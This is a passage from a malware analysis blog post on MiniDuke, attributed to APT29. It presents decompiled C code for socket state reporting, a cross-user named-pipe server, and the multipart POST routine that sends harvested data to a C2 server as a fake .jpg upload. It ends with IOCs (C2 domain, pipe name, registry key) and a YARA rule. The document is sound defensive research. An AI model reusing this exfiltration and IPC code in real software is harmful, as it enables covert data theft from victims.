    sub_406948(networkInfoStruct->tcpSocketActual, IpPortBothSides, 128);
    lstrcatA(ErrorMessagesOrData, IpPortBothSides);
    goto LABEL_12;
}
if ( !n4 )                                     // bind/listen failed
    return lstrcatA(ErrorMessagesOrData, "idle\n");
```

This works as an error-checking function that reports the socket state plus a `srcip:srcport -> destip:destport` string — meaning the malware author can also learn the victim's public IP address.

**Implication:** this checks whether socket connections to the target server work, and adjusts the next malware stage accordingly.

If the command sent was `"off"`, the attacker closes the sockets and sends final info:

```c
resetStuff9(frequentplace + 3);         // close socket
Sleep(0x3E8u);
retrieveSocketThreadState((frequentplace + 12), &ticksStruct->ErrorMessageOrDAta);
ticksStruct->legnthOfGatheredInfo += lstrlenA(&ticksStruct->ErrorMessageOrDAta);
ticksStruct->errorFlag = 0x81;
```

### Back to MainMalware: named pipes

```c
handlenamedPipes(MainStorage, MainStorage->LpRecievedData, MainStorage->ticks);
```

```c
BOOL __thiscall pipeServer(struct_127 *MainStorage, LPCSTR lpString2)
{
    DWORD LastError;
    BOOL var_C;

    lstrcpyA(&MainStorage->pipePath, "\\\\.\\pipe\\");
    lstrcatA(&MainStorage->pipePath, lpString2);
    MainStorage->namedPipe = CreateNamedPipeA( // open (or reuse) a pipe to communicate with the dropped malware running as a different user
        &MainStorage->pipePath,
        0x40040003u,   // overlapped, duplex
        6u,            // PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT
        1u,            // max 1 instance
        0x400u, 0x400u,
        0x64u,         // default timeout (to avoid deadlock)
        &MainStorage->securityDescriptor.Owner); // to communicate across users
    if ( MainStorage->namedPipe == INVALID_HANDLE_VALUE )
        return 0;
    memset(&MainStorage->field_4F[185], 0, 0x14u);
    MainStorage->evento = CreateEventA(0, 1, 0, 0); // manual-reset event, initially unsignaled
    var_C = ConnectNamedPipe(MainStorage->namedPipe, &MainStorage->even); // non-blocking; event signals on connect
    if ( var_C )                     // client connected immediately
        return var_C;
    LastError = GetLastError();
    if ( LastError == ERROR_IO_PENDING ) // still waiting; kernel signals the event once connected
        return 1;
    return LastError == 0x217 || var_C;  // client already connected before ConnectNamedPipe was called
}
```

Here we create an async named pipe at `\\.\pipe\DefPipe`, used as the primary IPC mechanism between this controller malware and the dropped payloads (with anonymous pipes as the backup method).

Note the last parameter to `CreateNamedPipeA` — the previously-discussed security descriptor — which makes this pipe available for cross-user IPC with DELETE/READ/WRITE rights.

```c
var_C = ConnectNamedPipe(MainStorage->namedPipe, &MainStorage->even);
```

Because this uses async I/O, the pipe server can be primed for connections and the program can move on without blocking — when a client connects, the system signals the event object.

```c
pipeCommunication(MainStorage, 0xBB8u)
```

```c
if ( MainStorage->namedPipe == -1 )
{
    Sleep(dwMilliseconds);            // no pipe yet
    return 1;
}
else if ( WaitForSingleObject(MainStorage->evento, dwMilliseconds) ) // wait for client connection
{
    return 0;                         // not signaled before timeout
}
else
{
    ResetEvent(MainStorage->evento);  // unsignal
    hMem = LocalAlloc(LMEM_ZEROINIT, 0x10u);
    Size = 0;
    n2 = 0;
    while ( n2 <= 2 )
    {
        if ( !PeekNamedPipe(MainStorage->namedPipe, 0, 0, 0, 0, BytesLeftThisMessage) )
            break;
        if ( BytesLeftThisMessage[0] )
        {
            hMem_1 = LocalAlloc(LMEM_ZEROINIT, BytesLeftThisMessage[0] + Size + 16);
            memcpy(hMem_1, hMem, Size);
            LocalFree(hMem);
            read_from_pipe = ReadFile(MainStorage->namedPipe, hMem_1 + Size, BytesLeftThisMessage[0], &NumberOfBytesRead, 0); // read from the pipe
            hMem = hMem_1;
            if ( !read_from_pipe )
            {
                LastError = GetLastError();
                if ( LastError != 234 )    // buffer smaller than needed
                    break;
            }
            Size += NumberOfBytesRead;
        }
        else
        {
            Sleep(0xAu);
            ++n2;                          // sleep and retry
        }
    }
    if ( Size )                            // if data was read
    {                                       // send all exfiltrated data along with the pipe data to the C2 server, get the response, and pass it back to the pipe client
        cbRecievedDataSize = (*MainStorage->DoAndHandleRequestResult)(
            MainStorage, hMem, NumberOfBytesRead, &recievedFileData);
        if ( cbRecievedDataSize )
        {
            if ( recievedFileData )
            {                               // send the (encrypted) response back to the target process
                v7 = WriteFile(MainStorage->namedPipe, recievedFileData, cbRecievedDataSize, &BytesLeftThisMessage[1], 0);
                FlushFileBuffers(MainStorage->namedPipe);
                LocalFree(recievedFileData);
                recievedFileData = 0;
                v15 = 1;
            }
        }
    }
    DisconnectNamedPipe(MainStorage->namedPipe);
    ConnectNamedPipe(MainStorage->namedPipe, &MainStorage->field_4F[185]);
    return v15;
}
```

The function starts by waiting for the client to connect (`WaitForSingleObject` on the event). It then checks whether the client wrote data to the pipe via `PeekNamedPipe`, and reads it if present.

```c
cbRecievedDataSize = (*MainStorage->DoAndHandleRequestResult)(
    MainStorage, hMem, NumberOfBytesRead, &recievedFileData);
```

All previously-collected data, plus whatever came in through the pipe, is sent to the attacker's C2 server via a POST request. The POST response is then relayed back to the pipe client for processing:

```c
if ( cbRecievedDataSize )
{
    if ( recievedFileData )
    {                                       // send the encrypted data back to the target process
        v7 = WriteFile(MainStorage->namedPipe, recievedFileData, cbRecievedDataSize, &BytesLeftThisMessage[1], 0);
        FlushFileBuffers(MainStorage->namedPipe);
        LocalFree(recievedFileData);
        recievedFileData = 0;
        v15 = 1;
    }
}
```

### Exfiltration 

```c
*(v3 + 342) = wininet_HttpOpenRequestA(*(v3 + 341), "POST", v3, 0, 0);
AddHttpRequestHeadrrs(&this[*(*this - 12)], *&this[*(*this - 12) + 1368]);
buildRadom_php(&this[*(*this - 12)], (this + 260), 256);
buildRadom_php(&this[*(*this - 12)], (this + 516), 4);
lstrcatA(this + 516, ".jpg");
lstrcpyA(String1, "Content-Type: multipart/form-data; boundary=");
lstrcatA(String1, this + 4);
wnsprintfA(pszDest, 1024,
    "--%s\r\n"
    "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
    "Content-Type: %s\r\n"
    "Content-Transfer-Encoding: %s\r\n"
    "\r\n",
    this + 4, this + 260, this + 516, this + 772, this + 1028);
wnsprintfA(pszDest_1, 1024, "\r\n--%s--\r\n", this + 4);
Size = lstrlenA(pszDest);
Size_1 = lstrlenA(pszDest_1);
v28 = nInBufferSize + Size + Size_1 + 16;
hMem = LocalAlloc(LMEM_ZEROINIT, nInBufferSize + Size + Size_1 + 17);
memcpy(hMem, pszDest, Size);
memcpy(hMem + Size, this + 1284, 0x10u);
memcpy(hMem + Size + 16, Src, nInBufferSize);
memcpy(hMem + nInBufferSize + Size + 16, pszDest_1, Size_1);
v4 = &this[*(*this - 12)];
*(v4 + 257) = wininet_HttpSendRequestA(*(v4 + 342), String1, -1, hMem, v28);
v5 = &this[*(*this - 12)];
*(v5 + 258) = GetLastError();
LocalFree(hMem);
return *&this[*(*this - 12) + 1028];
```

Finally, it disconnects from the pipe and reopens it for new connections:

```c
DisconnectNamedPipe(MainStorage->namedPipe);
ConnectNamedPipe(MainStorage->namedPipe, &MainStorage->field_4F[185]);
```

**End .**

## A Suggested Control-Flow Sequence (Based on Control Bytes)

1. GET request to receive data → decrypt using RC4
2. `0x11` — get the path in `%TEMP%` to drop the file to
3. `0x12` — drop the file
4. Calculate MD5 sum to verify the file decrypted correctly via RC4
5. `0x33` — create the process **suspended**, with anonymous pipes as a backup IPC mechanism
6. `0x31` — enumerate the process's first module
7. `0xC4` — enumerate the rest of its modules
8. Initialize the named pipe → if that communication fails, fall back to `0xE1` (anonymous pipes)
9. Send all harvested info to the attacker via a POST request
10. `0xE8` — terminate the created process once finished
11. Repeat, varying the behavior each round

## Indicators of Compromise

### Host-based IOCs

**Path:**
```
C:\Users\<username>\AppData\Local\Temp\trw0x5.TMP
```
*Importance:* the path where the malware drops its files (it can also drop them elsewhere).

**Registry key:**
```
Software\Microsoft\ApplicationManager\AppID
```
*Importance:* if this value exists under the key, it was created by the malware to store the tick count used to encrypt the cookie value.

**Named pipe:**
```
\\.\pipe\DefPipe
```
*Importance:* the main named pipe used to communicate between malware parts.

### Network-based IOCs

**C2 domain:**
```
http://salesappliances.com
```
*Importance:* the primary C2 server the malware communicates with via GET (requests) and POST (exfiltration).

**Local proxy:**
```
http://10.1.1.1:8080
```
*Importance:* the local proxy set via WinINet functions.

**GET request pattern:**
```
http://salesappliances.com/xxxxx.php
```
*Importance:* the malware uses a randomly generated filename on every request — watch for this pattern in network traffic.

## YARA Rule

```yara
rule detect_miniduke
{
    meta:
        description = "This rule is for the detection of MiniDuke malware by APT29 / Cozy Bear"
        author = "Hussam aljaar"
    strings:
        $url1 = "http://salesappliances.com/" ascii wide nocase
        $domain1 = "salesappliances.com:80" ascii wide nocase
        $ip = "http://10.1.1.1:8080" ascii wide nocase
        $regkey = "Software\\Microsoft\\ApplicationManager" ascii wide nocase
        $format1 = "pipe: \\%s\\pipe\\%s" ascii wide nocase
        $format2 = "uptime %5d.%02dh" ascii wide nocase
        $specialString = "--------------JiM9t8g7j8KoJkLJlKqka8dbo7q5z4v5u3o4z" ascii wide nocase
        $pipeName = "Defpipe" ascii wide nocase
    condition:
        uint32(uint32(0x3c)) == 0x4550 and any of them
}
```

## Conclusion

This was a detailed analysis of MiniDuke malware, which presented a real challenge for me — it has very diverse functionality, which made the dots harder to connect together. Have a good read :)

## Links and Resources

- [Asynchronous Operation — Win32 apps (Microsoft Learn)](https://learn.microsoft.com)
- [md5sum — C++ implementation of the MD5 algorithm (GitHub)](https://github.com)
- [File-Backed and Page-File-Backed Sections — Windows Drivers (Microsoft Learn)](https://learn.microsoft.com)
- [Windows API Hashing in Malware — Red Team Notes](https://www.ired.team)